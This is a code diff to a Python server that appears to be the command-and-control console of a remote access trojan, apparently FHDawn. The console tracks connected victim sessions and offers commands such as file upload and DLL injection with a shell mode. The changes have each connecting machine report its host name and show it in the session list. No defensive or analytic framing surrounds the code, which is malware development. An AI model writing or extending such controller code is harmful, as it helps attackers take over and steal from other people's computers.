@@ -12,6 +12,7 @@ import sys
 import random
 
 clients = [] # A List for client sockets
+hostList = [] # A list for Client userpcs
 iplist = [] # A List for Client IP's and Port as string
 log = [] # Must not exceed 1
 
@@ -40,8 +41,7 @@ class ClientManage:
         return basic client information
         """
         location = clients.index(self.client_socket)
-        return "Index : " + str(location) + " - IP : " + str(iplist[location])
-
+        return "Index : " + str(location) + " - IP : " + str(iplist[location]) + " - " + hostList[location]
     def SendData(self, data):
         try:
             self.client_socket.send(data.encode())
@@ -626,6 +626,7 @@ Open Ports
                     if(len(filename) > 0):
                         self.SendData("fupload:"+filename)
                         self.WaitForReply()
+                        time.sleep(5)
 
                 elif(main == "dllinject"):
                     shellmode = True
@@ -880,10 +881,17 @@ def TCPServer():
     #print("[I] Server Running.")
     while(True):
         client, addr = server.accept()
+        client.send("fhdawn_host".encode())
+        try:
+            host = client.recv(1024).decode()
+        except Exception as e:
+            print(str(e))
+            break
+        cld = ClientManage(client)
         clients.append(client)
         client_ip = str(addr[0]) +":"+ str(addr[1])
         iplist.append(client_ip)
-        cld = ClientManage(client)
+        hostList.append(host)
         print(cld.returnClientInfo())
         _thread.start_new_thread(cld.ClientThread, ())
 
@@ -907,7 +915,7 @@ def Console():
             if(len(clients) > 0): 
                 for i in range(len(iplist)):
                     print(  
-                        "\n[ SESSION ID : "+str(i) +" ][ Connection : "+iplist[i] + " ]"
+                        "\n[ SESSION ID : "+str(i) +" ][ Connection : "+iplist[i] + " ][ " + hostList[i] + " ]" 
                         )
         except Exception as stre:
             print("Error : " + str(stre))
